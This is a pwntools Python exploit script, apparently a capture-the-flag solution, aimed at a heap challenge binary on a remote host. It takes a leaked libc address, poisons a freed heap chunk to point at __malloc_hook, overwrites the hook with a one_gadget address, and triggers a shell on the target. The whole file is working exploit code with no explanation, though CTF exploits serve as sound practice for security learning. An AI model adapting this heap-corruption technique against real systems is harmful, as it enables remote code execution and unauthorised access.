from pwn import * 
import os 
os.system('clear')

exe = './task'
elf = context.binary = ELF(exe, checksec=False)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

library = './libc-2.31.so'
libc = context.binary = ELF(library, checksec=False)

def malloc(size, data: bytes):
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', f'{size}')
    sh.sendlineafter(b':', data)

def free(index: int):
    sh.sendlineafter(b'>', b'2')
    sh.sendlineafter(b':', f'{index}')

def edit(index, data):
    sh.sendlineafter(b'>', b'3')
    sh.sendlineafter(b':', f'{index}')
    sh.sendlineafter(b':', data)

# sh = process(exe)
sh = remote('rivit.dev', 10024)

sh.recvuntil(b'puts @ ')
get = sh.recvline().strip()
leaked = eval(get)
log.success(f'LEAKED LIBC PUTS --> {leaked}')

libc.address = leaked - libc.sym['puts']
log.info(f'LIBC ADDRESS --> {hex(libc.address)}')

malloc(0x68, b'A' * 8)
malloc(0x68, b'B' * 8)

free(0)
free(1)
# free(0)

sh.sendlineafter(b'>', b'3')
sh.sendlineafter(b':', b'1')
sh.sendlineafter(b':', pack(libc.sym['__malloc_hook'] - 51))

malloc(0x68, b'C' * 8)

one_gadget = (0xe6aee, 0xe6af1, 0xe6af4)[1]
gget = libc.address + one_gadget
info(f'ONE GADGET --> {hex(gget)}')

p = flat([
    cyclic(51),
    gget
])

malloc(0x68, p) # Overwrite __malloc_hook with one_gadget

# TRIGGER SHELL SPAWN
sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b':', b'0x68')
# sh.sendlineafter(b':', b'')

# gdb.attach(sh)

sh.interactive()
